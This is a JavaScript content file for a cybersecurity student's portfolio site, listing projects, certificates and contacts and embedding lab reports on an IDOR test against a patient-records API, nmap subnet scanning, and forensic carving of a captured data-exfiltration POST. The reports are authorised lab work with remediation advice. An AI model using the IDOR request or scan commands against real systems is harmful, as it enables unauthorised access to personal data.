/**
 * ============================================================================
 * PORTFOLIO CONTENT
 * ============================================================================
 * Single source of truth for everything rendered into the page.
 * Edit this file to add, update or remove entries — no markup or CSS changes
 * are required for new projects, writeups, certificates or reports.
 *
 * Loaded before script.js:
 *   <script src="content.js" defer></script>
 *   <script src="script.js" defer></script>
 *
 * ---------------------------------------------------------------------------
 * TYPES
 * ---------------------------------------------------------------------------
 *
 * @typedef {'in-progress' | 'documentation' | 'lab' | 'complete'} ProjectStatus
 *
 * @typedef {Object} Project
 * @property {string}   title          Project name.
 * @property {string}   description    Two or three sentences on what it is.
 * @property {string}   contribution   Exactly what you did. Always shown first.
 * @property {string[]} technologies   Tools, languages, frameworks.
 * @property {ProjectStatus} status    Displayed as plain text, not a badge.
 * @property {boolean}  featured       Featured entries sort first.
 * @property {string}   [image]        Path e.g. 'assets/images/projects/x.png'. Omit if none.
 * @property {string}   [repositoryUrl] Public repo. Omit unless the repo actually exists.
 * @property {string}   [demoUrl]      Live demo. Omit unless it actually runs.
 * @property {string}   [detailId]     Id of a localReports entry for an on-page deep dive.
 *
 * @typedef {Object} Writeup
 * @property {string}   title          Lab or article title.
 * @property {string}   platform       e.g. 'Hack The Box', 'TryHackMe', 'PortSwigger Web Security Academy'.
 * @property {string}   summary        Two sentences on the exercise.
 * @property {string[]} techniques     Techniques practised.
 * @property {string}   [difficulty]   'Easy' | 'Medium' | 'Hard'. Omit if not applicable.
 * @property {string}   [publishedAt]  ISO date 'YYYY-MM-DD'.
 * @property {string}   articleUrl     Medium article URL. Entries without one are not rendered.
 *
 * @typedef {Object} Certificate
 * @property {string} title
 * @property {string} [issuer]        Only when confirmed.
 * @property {string} [earnedAt]      'YYYY-MM' or 'YYYY-MM-DD'.
 * @property {string} [thumbnail]     Path under assets/images/certificates/.
 * @property {string} [fileUrl]       PDF or image under assets/certificates/.
 * @property {string} [verificationUrl] Credential verification page.
 *
 * @typedef {Object} LocalReport
 * @property {string} id      Anchor used by Project.detailId and the report buttons.
 * @property {string} title
 * @property {string} area    Shown as the small platform label on the report.
 * @property {string} summary One line, used on the card.
 * @property {string} body    Trusted HTML authored here; sanitized before rendering.
 *
 * @typedef {Object} Resume
 * @property {string|null} fileUrl       Path to the real PDF, or null when absent.
 * @property {boolean} isPlaceholder     true while the file is still the sample document.
 * @property {string} [updatedAt]        ISO date shown beside the filename.
 *
 * @typedef {Object} SocialLink
 * @property {'github'|'linkedin'|'x'|'medium'} icon
 * @property {string} label
 * @property {string} url
 * ============================================================================
 */

const SITE_CONTENT = {
  /* ------------------------------------------------------------------------
     PROJECTS
     Append an object here to add a card. `featured: true` moves it to the top.
     ------------------------------------------------------------------------ */
  projects: [
    {
      title: 'AI Phishing Email Detector',
      description:
        'A Python application that classifies phishing emails using TF-IDF text vectorisation and a logistic regression model, returning a probability score alongside the indicators that drove the decision.',
      contribution:
        'Built the classification pipeline end to end: header and body feature extraction, model training and evaluation, and the inspection interface.',
      technologies: ['Python', 'Flask', 'scikit-learn', 'HTML/CSS', 'JavaScript'],
      status: 'in-progress',
      featured: true,
      detailId: 'phishing-architecture',
      image: 'assets/images/project-phishing.svg',
    },
    {
      title: 'ShambaGuard — Security Documentation',
      description:
        'Security documentation and risk artefacts for an agricultural technology platform that handles farmer data and IoT sensor endpoints.',
      contribution:
        'Authored the threat models, policy baselines and secure-development standards. I did not write the application codebase.',
      technologies: ['Markdown', 'Git', 'STRIDE', 'Risk assessment'],
      status: 'documentation',
      featured: false,
      image: 'assets/images/project-shambaguard.svg',
    },
    {
      title: 'Web Application Security Testing',
      description:
        'A structured set of authorised lab exercises covering web application vulnerability testing, proof-of-concept verification, business-logic analysis and developer remediation guidance.',
      contribution:
        'Ran the manual testing and verification in a sanitised lab environment, and wrote up the findings and remediation notes.',
      technologies: ['Burp Suite', 'Browser DevTools', 'HTTP', 'OWASP Juice Shop'],
      status: 'lab',
      featured: false,
      detailId: 'idor',
      image: 'assets/images/project-webapp.svg',
    },
    {
      title: 'Network Security & Reconnaissance',
      description:
        'Network laboratory work covering authorised host discovery, service enumeration, traffic capture and interpretation of scan results across heterogeneous subnets.',
      contribution:
        'Carried out the enumeration and packet analysis, then documented the methodology and resulting findings.',
      technologies: ['Nmap', 'Wireshark', 'tcpdump', 'Linux CLI', 'Parrot OS'],
      status: 'lab',
      featured: false,
      detailId: 'network-recon',
      image: 'assets/images/project-network.svg',
    },
    {
      title: 'Digital Forensics Investigation',
      description:
        'Forensic investigation exercises covering evidence acquisition, file-header inspection, PCAP data carving and chain-of-custody documentation.',
      contribution:
        'Handled and analysed the evidence, and maintained the integrity records for each artefact.',
      technologies: ['Wireshark', 'hexdump', 'sha256sum', 'Linux utilities'],
      status: 'complete',
      featured: false,
      detailId: 'forensics',
      image: 'assets/images/project-forensics.svg',
    },
  ],

  /* ------------------------------------------------------------------------
     WRITEUPS
     Published articles only. An entry needs a real `articleUrl` to appear;
     the section shows an honest empty state until then.
     Example:
       {
         title: 'IDOR on a Patient Records API',
         platform: 'PortSwigger Web Security Academy',
         summary: 'Access-control testing that confirmed a horizontal privilege escalation, and the server-side ownership check that closes it.',
         techniques: ['Access control', 'Burp Suite Repeater', 'IDOR'],
         difficulty: 'Medium',
         publishedAt: '2026-03-14',
         articleUrl: 'https://medium.com/@B3A70/article-slug',
       },
     ------------------------------------------------------------------------ */
  writeups: [],

  /* ------------------------------------------------------------------------
     CERTIFICATIONS
     Add `issuer`, `earnedAt`, `fileUrl` and `verificationUrl` as they become
     available. Missing values are shown as plain states, never invented.
     Files go in assets/certificates/.
     ------------------------------------------------------------------------ */
  certificates: [
    {
      title: 'Ethical Hacking',
    },
    {
      title: 'Data Protection',
    },
    {
      title: 'Industrial Cybersecurity',
    },
  ],

  /* ------------------------------------------------------------------------
     LOCAL LAB REPORTS
     Sanitised exercises hosted on this site. `body` accepts HTML and is
     sanitized before it is injected into the dialog.
     ------------------------------------------------------------------------ */
  localReports: [
    {
      id: 'idor',
      title: 'Insecure Direct Object Reference on a Patient Records API',
      area: 'Web Application Security',
      summary:
        'Access-control testing against a records endpoint in an isolated medical testbed, confirming horizontal privilege escalation.',
      body: `
        <h4>1. Objective</h4>
        <p>Assess access-control boundaries in a multi-tenant medical lab testbed, determine whether an authenticated user can reach another patient's records without authorisation, and recommend defence-in-depth remediation.</p>

        <h4>2. Scope and environment</h4>
        <p>Authorised laboratory environment running on an isolated virtual machine. Testing was performed strictly within scope against <code>http://lab-api.internal/api/v1/patient/records?id={record_id}</code>.</p>

        <h4>3. Methodology</h4>
        <ul>
          <li>Authenticated as a low-privilege test account (User A, ID 104) and captured baseline API requests through the Burp Suite proxy.</li>
          <li>Inspected response headers and payload structure containing consultation notes and personal data.</li>
          <li>Sent the request to Burp Suite Repeater and modified the query parameter to target User B (ID 105).</li>
        </ul>
        <pre>GET /api/v1/patient/records?id=105 HTTP/1.1
Host: lab-api.internal
Authorization: Bearer [REDACTED_SESSION_TOKEN]
Accept: application/json</pre>

        <h4>4. Findings</h4>
        <p>The server returned <code>HTTP/1.1 200 OK</code> with User B's laboratory results and personal details. The application verified that the requester held a valid session token but never checked whether that session was entitled to the requested record ID.</p>

        <h4>5. Risk</h4>
        <p><strong>CVSS 3.1 severity: High (7.5).</strong> Direct compromise of patient data confidentiality. Sequential numeric identifiers allow an attacker to enumerate the entire patient table.</p>

        <h4>6. Remediation</h4>
        <ul>
          <li>Enforce server-side authorisation so that <code>record.owner_id</code> must equal <code>session.current_user_id</code>.</li>
          <li>Replace predictable integer identifiers with non-sequential UUIDv4 values.</li>
          <li>Add automated authorisation tests to the pipeline for every REST endpoint.</li>
        </ul>

        <h4>7. Lessons learned</h4>
        <p>Client-side assumptions must never govern backend data access. Authorisation has to be validated on every transactional endpoint, not only at the entry point.</p>
      `,
    },
    {
      id: 'network-recon',
      title: 'Subnet Discovery, Service Enumeration and Traffic Dissection',
      area: 'Network Defense',
      summary:
        'Structured discovery of an isolated subnet, service fingerprinting, and packet analysis of cleartext protocol leakage.',
      body: `
        <h4>1. Objective</h4>
        <p>Perform structured network discovery, identify live hosts, fingerprint open services and operating-system versions, and analyse cleartext protocol leakage through packet inspection.</p>

        <h4>2. Scope and environment</h4>
        <p>Isolated VirtualBox host-only subnet (192.168.56.0/24). Attacker system: Parrot Security OS (192.168.56.101). Target: vulnerable Linux server (192.168.56.102).</p>

        <h4>3. Tools and commands</h4>
        <pre># Phase 1: host discovery without ping probes
nmap -sn 192.168.56.0/24

# Phase 2: SYN scan with service and OS detection
nmap -sS -sV -sC -O -T3 -p- -oN target_scan.txt 192.168.56.102

# Phase 3: packet capture during service interaction
wireshark -i eth1 -f "host 192.168.56.102"</pre>

        <h4>4. Findings</h4>
        <p>Port 21/tcp ran an obsolete vsftpd 2.3.4 service, port 80/tcp ran Apache 2.4.29, and port 22/tcp ran OpenSSH 7.6p1. Packet analysis confirmed that FTP login attempts crossed the wire in cleartext with no TLS encapsulation.</p>

        <h4>5. Risk and remediation</h4>
        <p><strong>Risk: Critical.</strong> Unencrypted transmission lets any adjacent host on the subnet capture credentials through passive monitoring, and vsftpd 2.3.4 carries a known backdoor.</p>
        <ul>
          <li>Decommission the legacy FTP daemon and move file transfer to SFTP.</li>
          <li>Restrict management services to trusted administrative subnets with host-based firewall rules.</li>
        </ul>

        <h4>6. Lessons learned</h4>
        <p>Service-version fingerprinting combined with live traffic analysis reveals attack surface that automated port scanning alone cannot contextualise.</p>
      `,
    },
    {
      id: 'forensics',
      title: 'PCAP Traffic Analysis and Forensic Data Stream Carving',
      area: 'Digital Forensics',
      summary:
        'Investigation of a captured incident file, reconstruction of HTTP transfers and extraction of forensic artefacts with integrity verification.',
      body: `
        <h4>1. Objective</h4>
        <p>Analyse a captured network incident file, identify suspicious outbound channels, rebuild HTTP file transfers and extract artefacts while maintaining evidence integrity.</p>

        <h4>2. Evidence verification</h4>
        <p>Evidence file: <code>incident_capture_sanitized.pcapng</code>. Baseline cryptographic integrity was recorded before analysis:</p>
        <pre>sha256sum incident_capture_sanitized.pcapng
Hash: 9e107d9d372bb6826bd81d3542a419d6dae89... [VERIFIED]</pre>

        <h4>3. Methodology</h4>
        <ul>
          <li>Reviewed the protocol hierarchy to inspect anomalous traffic ratios across TCP, UDP and HTTP.</li>
          <li>Identified high-volume HTTP POST requests directed at an unauthorised external address (198.51.100.44).</li>
          <li>Reassembled the TCP stream and observed an encoded multipart payload.</li>
        </ul>
        <pre>POST /upload.php HTTP/1.1
Host: 198.51.100.44
User-Agent: Mozilla/5.0 (Custom Exfil Script)
Content-Type: multipart/form-data; boundary=----WebKitBoundary7MA4YWxk

------WebKitBoundary7MA4YWxk
Content-Disposition: form-data; name="file"; filename="confidential.zip"
[BASE64 BLOB EXTRACTED]</pre>

        <h4>4. Findings</h4>
        <p>The carved payload was decoded with <code>base64 -d extracted_stream.txt > artifact.zip</code> and contained an unencrypted internal employee directory. Magic-byte inspection confirmed the header <code>50 4B 03 04</code> (PK zip).</p>

        <h4>5. Remediation and response</h4>
        <ul>
          <li>Block destination <code>198.51.100.44</code> at the perimeter firewall and egress proxy.</li>
          <li>Apply egress data-loss-prevention rules that reject outbound unencrypted archive uploads.</li>
        </ul>

        <h4>6. Lessons learned</h4>
        <p>A write-protected master copy and a documented hash calculation for every artefact are what keep digital evidence forensically sound.</p>
      `,
    },
    {
      id: 'phishing-architecture',
      title: 'AI Phishing Email Detector — Technical Breakdown',
      area: 'Project Architecture',
      summary:
        'How the classifier is put together: vectorisation, model choice, the indicators it surfaces, and what still needs tuning.',
      body: `
        <h4>Purpose</h4>
        <p>The detector classifies email headers, body semantics and embedded links to separate ordinary correspondence from social-engineering attempts, and explains which indicators pushed the score up.</p>

        <h4>Pipeline</h4>
        <ul>
          <li><strong>Backend:</strong> Python 3 with the Flask micro-framework.</li>
          <li><strong>Libraries:</strong> scikit-learn, NLTK, NumPy and pandas.</li>
          <li><strong>Feature engineering:</strong> TF-IDF n-gram vectorisation over unigrams and bigrams.</li>
          <li><strong>Classification:</strong> logistic regression with a multinomial naive Bayes baseline for comparison.</li>
          <li><strong>Interface:</strong> HTML5, CSS3 and JavaScript inspector with a confidence readout.</li>
        </ul>

        <h4>Indicators extracted</h4>
        <pre>1. Domain mismatch between display name and the SMTP From header
2. Density of urgency keywords ("immediate action", "account suspended")
3. IP-based or newly registered links
4. DKIM, SPF and DMARC alignment discrepancies</pre>

        <h4>Status</h4>
        <p>Feature weights are being tuned against open, sanitised corpora, and precision, recall and F1 are being measured to reduce false positives before the repository is published.</p>
      `,
    },
  ],

  /* ------------------------------------------------------------------------
     RESUME
     Drop your PDF in assets/ and point fileUrl at it. Set isPlaceholder to
     false once it is your own CV rather than the sample document.
     ------------------------------------------------------------------------ */
  resume: {
    fileUrl: 'assets/cv-placeholder.pdf',
    isPlaceholder: true,
    updatedAt: null,
  },

  /* ------------------------------------------------------------------------
     CONTACT
     ------------------------------------------------------------------------ */
  contact: {
    email: 'beatricemwende268@gmail.com',
    links: [
      { icon: 'github', label: 'GitHub', url: 'https://github.com/Beato-6' },
      {
        icon: 'linkedin',
        label: 'LinkedIn',
        url: 'https://www.linkedin.com/in/beatrice-mwende-230810359',
      },
      { icon: 'x', label: 'X', url: 'https://x.com/Beariz206' },
      { icon: 'medium', label: 'Medium', url: 'https://medium.com/@B3A70' },
    ],
  },

  mediumProfileUrl: 'https://medium.com/@B3A70',
  githubProfileUrl: 'https://github.com/Beato-6',
};

window.SITE_CONTENT = SITE_CONTENT;
